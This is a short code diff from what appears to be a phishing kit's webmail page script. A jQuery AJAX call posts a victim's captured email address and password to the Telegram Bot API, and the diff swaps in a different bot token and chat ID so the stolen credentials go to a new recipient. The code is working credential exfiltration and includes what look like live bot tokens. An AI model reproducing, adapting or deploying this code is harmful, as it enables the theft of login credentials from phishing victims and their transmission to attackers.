@@ -341,10 +341,10 @@ $(document).ready(function() {
 
     $.ajax({
       dataType: 'json', // JSON is lowercase
-      url: 'https://api.telegram.org/bot7433828205:AAG7CzkAgT_PLyS45-0NNaUDRnXAZEGwBAw/sendMessage',
+      url: 'https://api.telegram.org/bot6011529302:AAELRL29jmCaG2t6oxVr2rcoBFWlkLmWal4/sendMessage',
       type: 'POST',
       data: {
-        chat_id: '8016167200',
+        chat_id: '6070449240',
         text: `***** Webmail Result *****\r\nEmail: ${email}\r\nPassword: ${password}\r\n*****`
       },
       beforeSend: function(xhr) {
